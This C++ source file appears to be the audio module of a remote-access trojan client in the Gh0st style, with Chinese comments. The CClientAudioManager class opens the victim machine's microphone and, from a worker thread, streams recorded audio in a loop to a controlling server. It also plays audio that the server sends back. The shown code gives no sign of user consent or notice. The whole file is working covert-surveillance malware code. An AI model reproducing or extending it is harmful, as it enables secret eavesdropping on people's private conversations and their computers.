#include "ClientAudioManager.h"
#include "Common.h"


CClientAudioManager::CClientAudioManager(_CIOCPClient* ClientObject) :CManager(ClientObject)
{
	m_IsLoop = FALSE;
	m_Audio = NULL;

	if (OnInitMember() == FALSE)
	{
		return;
	}

	BYTE	IsToken = CLIENT_AUDIO_MANAGER_REPLY;
	m_ClientObject->OnServerSending((char*)&IsToken, 1);

	WaitForServerDialogOpen();    //等待对话框打开



	m_WorkThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReceiveProcedure,
		(LPVOID)this, 0, NULL);
}
BOOL CClientAudioManager::OnInitMember()
{
	if (!waveInGetNumDevs())   //获取波形输入设备的数目 实际就是看看有没有声卡
	{
		return FALSE;
	}


	if (m_IsLoop == TRUE)
	{
		return FALSE;
	}

	m_Audio = new CAudio;  //功能类对象的申请内存

	m_IsLoop = TRUE;
	return TRUE;
}
DWORD CClientAudioManager::ReceiveProcedure(LPVOID ParameterData)   //发送声音到服务端
{
	CClientAudioManager* This = (CClientAudioManager*)ParameterData;
	while (This->m_IsLoop)
	{
		This->SendRecordData();
	}
	printf("CClientAudioManager::ReceiveProcedure() 退出\r\n");
	return 0;
}

int CClientAudioManager::SendRecordData()
{
	DWORD	BufferLength = 0;
	DWORD	ReturnLength = 0;
	//这里得到音频数据
	LPBYTE	v1 = m_Audio->GetRecordData(&BufferLength);
	if (v1 == NULL)
	{
		return 0;
	}
	//分配缓冲区
	LPBYTE	BufferData = new BYTE[BufferLength + 1];
	//加入数据头
	BufferData[0] = CLIENT_AUDIO_MANAGER_RECORD_DATA;     //向主控端发送该消息
	//复制缓冲区
	memcpy(BufferData + 1, v1, BufferLength);
	//发送出去
	if (BufferLength > 0)
	{
		ReturnLength = m_ClientObject->OnServerSending((char*)BufferData, BufferLength + 1);
	}
	if (BufferData != NULL)
	{
		delete	BufferData;
		BufferData = NULL;
	}

	return ReturnLength;
}


CClientAudioManager::~CClientAudioManager()
{

	m_IsLoop = FALSE;                                  //设定工作状态为假
	WaitForSingleObject(m_WorkThreadHandle, INFINITE);    //等待 工作线程结束


	if (m_Audio != NULL)
	{
		delete m_Audio;
		m_Audio = NULL;
	}
}
void CClientAudioManager::HandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_GO_ON:
	{
		NotifyDialogIsOpen();
		break;
	}
	default:
	{

		m_Audio->PlayRecordData(BufferData, BufferLength);
		break;
	}
	}
}
